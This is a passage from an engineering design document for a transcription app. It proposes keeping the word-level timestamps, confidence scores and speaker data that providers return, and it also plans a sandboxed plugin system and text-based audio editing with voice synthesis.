	const audioBlob = await audioStorage.getAudioBlob(recordingId);
	if (!audioBlob) {
		throw new Error('Audio not found');
	}

	// 2. Re-transcribe with word-level timestamps
	const transcriptionResult = await transcriptionService.transcribe(audioBlob, {
		returnWordTimestamps: true, // NEW option
	});

	// 3. Convert to document items
	const segments = transcriptToDocumentItems(
		transcriptionResult.segments,
		recordingId, // source reference
		'Speaker', // default speaker name
	);

	// 4. Update recording
	workspace.tables.recordings.update({
		id: recordingId,
		segments,
		isProject: true,
		// Keep transcribedText for backwards compat
	});
}

// Helper: Convert transcript segments to document items
function transcriptToDocumentItems(
	segments: TranscriptSegment[],
	sourceId: string,
	defaultSpeaker: string,
): DocumentItem[] {
	const items: DocumentItem[] = [
		{
			type: 'paragraph_start',
			uuid: nanoid(),
			speaker: defaultSpeaker,
			language: null,
		},
	];

	for (const segment of segments) {
		if (segment.type === 'word') {
			items.push({
				type: 'text',
				uuid: nanoid(),
				source: sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
				text: segment.word,
				conf: segment.confidence,
			});
		} else if (segment.type === 'non_speech') {
			items.push({
				type: 'non_text',
				uuid: nanoid(),
				source: sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
			});
		}
	}

	items.push({ type: 'paragraph_end', uuid: nanoid() });
	return items;
}
```

### Transcription Service Update

```typescript
// Current transcription return type
type TranscriptionResult = string;

// Enhanced return type
type TranscriptionResult = {
	text: string; // Plain text (backwards compat)
	segments?: TranscriptSegment[]; // Word-level data (if requested)
};

type TranscriptSegment = {
	type: 'word' | 'punctuation' | 'non_speech';
	word: string;
	start: number; // seconds
	end: number; // seconds
	confidence: number;
};

// API support for word-level timestamps
// ──────────────────────────────────────────────────────────────────
// Provider        │ Parameter
// ──────────────────────────────────────────────────────────────────
// OpenAI Whisper  │ response_format: 'verbose_json'
//                 │ timestamp_granularities: ['word']
// ──────────────────────────────────────────────────────────────────
// Groq            │ response_format: 'verbose_json'
// ──────────────────────────────────────────────────────────────────
// Deepgram        │ Default behavior (always returns words)
// ──────────────────────────────────────────────────────────────────
// AssemblyAI      │ Default behavior
// ──────────────────────────────────────────────────────────────────
// ElevenLabs      │ Supported (per docs)
// ──────────────────────────────────────────────────────────────────
// Local Whisper   │ whisper.cpp supports word timestamps
// ──────────────────────────────────────────────────────────────────
```

### Discarded Transcription Data

Currently, all transcription services extract **only `.text.trim()`**, discarding significant metadata that would enable text-based editing, confidence visualization, and speaker identification.

#### Data Being Dropped by Provider

| Provider        | Word Timestamps |        Segments         |          Confidence           |         Speaker ID         | Language  | Notes                           |
| --------------- | :-------------: | :---------------------: | :---------------------------: | :------------------------: | :-------: | ------------------------------- |
| **OpenAI**      |    Available    |        Available        |           Available           |             ❌             | Available | Needs `verbose_json` option     |
| **Deepgram**    |    Available    |        Available        | **In schema, not extracted!** |         Available          | Available | Rich metadata available         |
| **Groq**        |    Available    |        Available        |           Available           |             ❌             | Available | OpenAI-compatible               |
| **ElevenLabs**  |    Available    |        Via words        |           Available           | **Requested but dropped!** | Available | `diarize: true` set but ignored |
| **Mistral**     |       ❌        |        Available        |              ❌               |             ❌             | Available | Segment timestamps only         |
| **Whisper.cpp** |    Available    |        Available        |           Available           |             ❌             | Available | Via params                      |
| **Parakeet**    |       ❌        | **Requested, dropped!** |              ❌               |             ❌             |    ❌     | Rust-side discard               |

#### Critical Findings

1. **ElevenLabs `diarize: true`** - Speaker diarization is explicitly requested but results completely discarded:

   ```typescript
   // Line 64-74 in elevenlabs.ts
   const transcription = await client.speechToText.convert({
   	file: audioBlob,
   	diarize: true, // REQUESTED!
   });
   return Ok(transcription.text.trim()); // speaker_id DROPPED!
   ```

2. **Deepgram `confidence`** - Defined in schema but never extracted:

   ```typescript
   // Line 48-56 in deepgram.ts
   const DeepgramResponse = type({
   	results: {
   		channels: type({
   			alternatives: type({
   				transcript: 'string',
   				'confidence?': 'number', // EXISTS but NEVER USED!
   			}).array(),
   		}).array(),
   	},
   });
   ```

3. **Parakeet timestamps** - Explicitly requested in Rust but discarded:

   ```rust
   // transcription.rs line 636-639
   let params = ParakeetInferenceParams {
       timestamp_granularity: TimestampGranularity::Segment,  // REQUESTED!
       ..Default::default()
   };
   let transcript = result.text.trim().to_string();  // Timestamps DROPPED!
   ```

4. **OpenAI/Groq** - Have `verbose_json` and `timestamp_granularities` options but not used.

#### What We're Missing

| Missing Data          | Use Case                                      |
| --------------------- | --------------------------------------------- |
| Word-level timestamps | Text-based editing (Sections 16-18)           |
| Confidence scores     | Highlight uncertain words for review          |
| Speaker diarization   | Meeting transcripts, interviews, podcasts     |
| `no_speech_prob`      | Detect non-speech audio sections              |
| `compression_ratio`   | Flag potentially failed transcriptions        |
| Language detection    | Auto-set UI language, multi-language support  |
| Audio events          | Detect laughter, applause, music (ElevenLabs) |

### Enhanced Transcription Return Type

```typescript
type TranscriptionResult = {
	// ═══════════════════════════════════════════════════════════════════
	// NORMALIZED DATA (always present, provider-agnostic)
	// ═══════════════════════════════════════════════════════════════════
	text: string;
	segments?: TranscriptSegment[];
	language?: {
		code: string;
		confidence?: number;
	};
	duration?: number;

	// ═══════════════════════════════════════════════════════════════════
	// PROVENANCE (lightweight, always stored)
	// ═══════════════════════════════════════════════════════════════════
	provenance: {
		provider:
			| 'openai'
			| 'deepgram'
			| 'elevenlabs'
			| 'groq'
			| 'mistral'
			| 'local';
		model: string;
		timestamp: string; // When transcribed (ISO 8601)
		apiVersion?: string; // For debugging API changes
	};

	// ═══════════════════════════════════════════════════════════════════
	// RAW RESPONSE (optional, user-configurable)
	// ═══════════════════════════════════════════════════════════════════
	raw?: unknown; // Original API response, stored if setting enabled
};

type TranscriptSegment = {
	text: string;
	start: number; // Start time (seconds)
	end: number; // End time (seconds)
	confidence?: number; // 0-1 confidence score
	speakerId?: string; // Speaker identification
	type?: 'speech' | 'non_speech' | 'audio_event';
	words?: TranscriptWord[]; // Word-level detail (if available)
};

type TranscriptWord = {
	word: string;
	start: number;
	end: number;
	confidence?: number;
	speakerId?: string;
};
```

### Raw Response Storage Strategy

#### Tradeoffs

| Approach        | Storage         | Future-Proof          | Queryable           | Privacy        |
| --------------- | --------------- | --------------------- | ------------------- | -------------- |
| Normalized only | ✅ Small        | ❌ Must re-transcribe | ✅ Easy             | ✅ Easy        |
| Raw only        | ❌ 4x larger    | ✅ Re-extract anytime | ❌ Hard             | ❌ Hard        |
| **Hybrid**      | ✅ Configurable | ✅ When raw stored    | ✅ Query normalized | ✅ User choice |

#### Storage Size Comparison

```
1-minute recording (~150 words):
├── text only:     ~1 KB
├── + segments:    ~7.5 KB (normalized)
└── + raw:         ~30 KB (4x increase)

1000 recordings:
├── Without raw:   ~8.5 MB
└── With raw:      ~38.5 MB (+30 MB)
```

#### Recommended: Hybrid Approach

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    RAW RESPONSE STORAGE DECISION                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ALWAYS STORE:                                                           │
│  • Normalized data (segments, language, duration)                       │
│  • Provenance (provider, model, timestamp) - tiny, invaluable           │
│                                                                          │
│  OPTIONALLY STORE RAW (user setting, default: off):                     │
│  • Development/debugging mode                                           │
│  • When transcription confidence < threshold                            │
│  • Power users who want maximum data retention                          │
│  • First N recordings (bootstrap learning)                              │
│                                                                          │
│  NEVER STORE RAW:                                                        │
│  • Low storage mode / mobile                                            │
│  • Privacy-sensitive contexts                                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Updated Workspace Schema

```typescript
const WHISPERING_TEMPLATE = {
	tables: {
		recordings: table({
			fields: {
				// ... existing fields ...

				// Normalized segments (always stored when available)
				segments: json({
					schema: Type.Array(TranscriptSegmentSchema),
					nullable: true,
				}),

				// Provenance (lightweight, always stored)
				transcriptionProvenance: json({
					schema: Type.Object({
						provider: Type.String(),
						model: Type.String(),
						timestamp: Type.String(),
						apiVersion: Type.Optional(Type.String()),
					}),
					nullable: true,
				}),

				// Raw response (optional, based on setting)
				transcriptionRawResponse: json({
					schema: Type.Unknown(), // Any JSON
					nullable: true,
				}),

				// Detected language
				detectedLanguage: json({
					schema: Type.Object({
						code: Type.String(),
						confidence: Type.Optional(Type.Number()),
					}),
					nullable: true,
				}),

				// Audio duration
				audioDuration: real({ nullable: true }),
			},
		}),
	},
	kv: {
		// User setting to control raw storage
		storeRawTranscriptionResponses: setting({
			name: 'Store Raw Responses',
			description:
				'Keep original API responses for debugging. Uses more storage.',
			field: boolean({ default: false }),
		}),
	},
};
```

#### Provider-Specific Changes Required

| Provider       | Change                                                                     |
| -------------- | -------------------------------------------------------------------------- |
| **OpenAI**     | Add `response_format: 'verbose_json'`, `timestamp_granularities: ['word']` |
| **Deepgram**   | Extract existing `confidence`, add `words` array to schema                 |
| **ElevenLabs** | Extract `words` array with `speaker_id`, enable `tag_audio_events`         |
| **Groq**       | Same as OpenAI                                                             |
| **Mistral**    | Add `timestampGranularities: ['segment']`                                  |
| **Parakeet**   | Return timestamps from Rust layer (already requested!)                     |

#### Backwards Compatibility

```typescript
// Service returns enhanced result
const result = await transcriptionService.transcribe(audio, options);

// Existing code still works (just uses .text)
recording.transcribedText = result.text;

// New code can use rich metadata
if (result.segments) {
	recording.segments = convertToDocumentItems(result.segments);
}
if (result.provenance) {
	recording.transcriptionProvenance = result.provenance;
}
if (result.language) {
	recording.detectedLanguage = result.language;
}
```

### Implementation Phases for Vault Integration

| Phase | Scope                                                      | Effort  |
| ----- | ---------------------------------------------------------- | ------- |
| **1** | Add `segments`, `speakers`, `isProject` fields to template | 1 day   |
| **2** | Add `provenance`, `rawResponse`, `detectedLanguage` fields | 0.5 day |
| **3** | Update transcription services to return enhanced result    | 4 days  |
| **4** | Implement `migrateToProject()` function                    | 2 days  |
| **5** | Add generated audio storage (`{id}.generated/`)            | 1 day   |
| **6** | Update UI to show "Edit as Project" button                 | 1 day   |
| **7** | Sync `transcribedText` when `segments` changes             | 1 day   |
| **8** | Add "Store raw responses" setting in UI                    | 0.5 day |

**Total: ~11 days** (before Editor UI work)

---

## Recommendations

### Architecture Decision

**Recommended: Capability-Based Plugin System with Wasm + iframes**

1. **Service plugins** (transcription, completion): Wasm (Extism) for security
2. **UI plugins** (pages, components): Pre-compiled Svelte with iframe fallback for untrusted
3. **System plugins** (CPAL, FFmpeg): Native Rust, verified/signed only

### Plugin Manifest Schema

```typescript
interface PluginManifest {
	id: string;
	name: string;
	version: string;
	whisperingVersion: string; // Compatibility

	capabilities: {
		network?: string[];
		'settings:read'?: string[];
		'settings:write'?: string[];
		'audio:read'?: boolean;
		'clipboard:write'?: boolean;
		'transcription:provide'?: boolean;
		'routes:register'?: boolean;
	};

	provides?: {
		transcriptionServices?: TranscriptionPlugin[];
		completionProviders?: CompletionPlugin[];
		routes?: RouteDefinition[];
	};
}
```

### Implementation Phases: Plugin System

| Phase | Scope                                         | Effort  |
| ----- | --------------------------------------------- | ------- |
| **1** | Plugin loader + Groq transcription extraction | 2 weeks |
| **2** | Remaining transcription services              | 2 weeks |
| **3** | Completion providers                          | 1 week  |
| **4** | Recordings page as optional plugin            | 2 weeks |
| **5** | Mobile recordings alternative plugin          | 1 week  |
| **6** | Transformations page extraction               | 2 weeks |
| **7** | Navigation as pluggable                       | 1 week  |

### Implementation Phases: Text-Based Editing & Voice Synthesis

| Phase | Scope                                              | Effort  | Dependencies |
| ----- | -------------------------------------------------- | ------- | ------------ |
| **1** | Word-level timestamps in transcription             | 1 week  | None         |
| **2** | Document model + Editor Actor                      | 2 weeks | Phase 1      |
| **3** | Playback with RenderItems                          | 1 week  | Phase 2      |
| **4** | FFmpeg export pipeline                             | 2 weeks | Phase 3      |
| **5** | Editor UI (waveform, transcript sync)              | 3 weeks | Phase 4      |
| **6** | Voice Synth Actor + plugin interface               | 1 week  | Phase 5      |
| **7** | Stock voice TTS plugins (OpenAI, Piper)            | 1 week  | Phase 6      |
| **8** | Voice cloning (ElevenLabs, Coqui XTTS)             | 2 weeks | Phase 7      |
| **9** | Advanced features (styles, streaming, local clone) | 2 weeks | Phase 8      |

**Total for text-based editing + voice synthesis: ~16 weeks**

### Epicenter Platform Migration

| Phase | Scope                                                |
| ----- | ---------------------------------------------------- |
| **1** | Extract core services to `@epicenter/core`           |
| **2** | Integrate `@epicenter/hq` for Whispering data        |
| **3** | Create Epicenter shell (app switcher, global search) |
| **4** | Refactor Whispering as Epicenter app                 |
| **5** | Build additional apps (Notes, Journal, etc.)         |

---

## Next Steps

### Immediate (If Proceeding)

1. **Design plugin manifest schema** in detail
2. **Prototype plugin loader** for one extension point (e.g., transcription)
3. **Extract Groq transcription** as first plugin
4. **Validate security model** with capability checking
5. **Set up jsrepo** for plugin distribution
6. **Implement permission UI** (allow/ask/deny with glob patterns)
7. **Define event schema** for Functional Core (WhisperingEvent types)
8. **Build plugin SDK** with WhisperingBridge class

### Questions to Answer

1. **Single app or multi-window?** Tabs vs separate windows vs hybrid
2. **Data sharing permissions?** Default read access vs explicit grants
3. **Sync strategy?** Local-only vs optional cloud sync
4. **Distribution model?** Bundled core apps + marketplace?
5. **Verified publisher requirements?** DNS vs GitHub vs time-based?
6. **Tier 3 signing process?** Who reviews? How long?

### Research to Continue

**Plugin System:**

1. Tauri plugin patterns for native API exposure
2. Extism integration with Tauri/Rust
3. YJS sync providers for cross-device
4. Plugin marketplace UX patterns
5. jsrepo private registry setup
6. GitHub Artifact Attestations workflow
7. Sigstore/cosign integration for verification UI
8. Event sourcing libraries for TypeScript (or roll own)
9. YJS observer → plugin event bridge patterns

**Text-Based Editing:** 10. FFmpeg filter chains for Tauri (audio/video splicing) 11. Waveform visualization libraries (wavesurfer.js, Web Audio API) 12. Transcript ↔ waveform synchronization patterns 13. Non-destructive edit list formats (EDL, AAF) 14. Word-level timestamp providers (comparison: Whisper vs Deepgram vs AssemblyAI)

**Voice Synthesis:** 15. TTS provider comparison (latency, quality, pricing, voice cloning) 16. Local voice cloning options (Coqui XTTS, Bark, etc.) 17. Voice clone consent and legal requirements 18. Audio watermarking for AI-generated content 19. Prosody matching across spliced segments

---

## Appendix A: File References

### Whispering Architecture

- Services: `apps/whispering/src/lib/services/`
- Query layer: `apps/whispering/src/lib/query/`
- Settings: `apps/whispering/src/lib/settings/settings.ts`
- Commands: `apps/whispering/src/lib/commands.ts`
- Transcription registry: `apps/whispering/src/lib/services/isomorphic/transcription/registry.ts`

### Epicenter Packages

- HQ (YJS workspaces): `packages/epicenter/`
- Vault Core: `packages/vault-core/`
- UI Components: `packages/ui/`
- Svelte Utils: `packages/svelte-utils/`

### Key Patterns

- Service factory: `createMyService()` → `MyServiceLive`
- Platform detection: `window.__TAURI_INTERNALS__`
- Settings schema: ArkType with progressive validation

---

## Appendix B: Audapolis Reference

[Audapolis](https://github.com/bugbakery/audapolis) is an open-source text-based audio/video editor that informed our architecture for Section 16 and 17.

### Key Files

| File                                | Purpose                                          |
| ----------------------------------- | ------------------------------------------------ |
| `app/src/core/document.ts`          | Document model, source references, serialization |
| `app/src/core/player.ts`            | Playback using RenderItems                       |
| `app/src/core/ffmpeg.ts`            | Export pipeline with segment concatenation       |
| `app/src/state/editor/types.ts`     | Editor state, cursor, selection                  |
| `app/src/state/editor/edit.ts`      | Edit reducers (delete, paste, etc.)              |
| `app/src/state/editor/selectors.ts` | Computed timing, RenderItems generation          |

### Architecture Patterns We Adopted

1. **Source Reference Model** - Words point to positions in source media, not stored audio
2. **Flat Document Array** - Items with paragraph markers vs nested structure
3. **Computed Timing** - `absoluteStart` computed on-demand, not stored
4. **RenderItems** - Edit Decision List for playback/export
5. **ZIP File Format** - Document JSON + source media in one portable file

### Differences from Audapolis

| Aspect               | Audapolis                  | Our Design                  |
| -------------------- | -------------------------- | --------------------------- |
| **Framework**        | Electron + React + Redux   | Tauri + Svelte + Actors     |
| **State Management** | Redux + Immer + redux-undo | Actor state with FC/IS      |
| **Voice Synthesis**  | Not supported              | Voice Synth Actor + plugins |
| **Plugin System**    | None                       | Sandboxed iframes + CSP     |
| **Data Sync**        | Local files only           | YJS workspaces              |
| **Transcription**    | External (Vosk server)     | Pluggable (cloud + local)   |

---

## Appendix C: Glossary

| Term                         | Definition                                                                    |
| ---------------------------- | ----------------------------------------------------------------------------- |
| **Source Reference**         | Pointer to a position (start time, duration) in original media                |
| **RenderItem**               | Instruction for playback/export: "play X seconds from source Y at position Z" |
| **Edit Decision List (EDL)** | Sequence of RenderItems defining the final output                             |
| **Non-Destructive Editing**  | Original media unchanged; edits stored as references                          |
| **Voice Clone**              | AI model trained on speaker's voice for synthesis                             |
| **Generated Text**           | Document item with AI-synthesized audio instead of source reference           |
| **Word-Level Timestamps**    | Per-word start/end times from transcription                                   |
| **Computed Timing**          | Absolute positions calculated from item lengths, not stored                   |
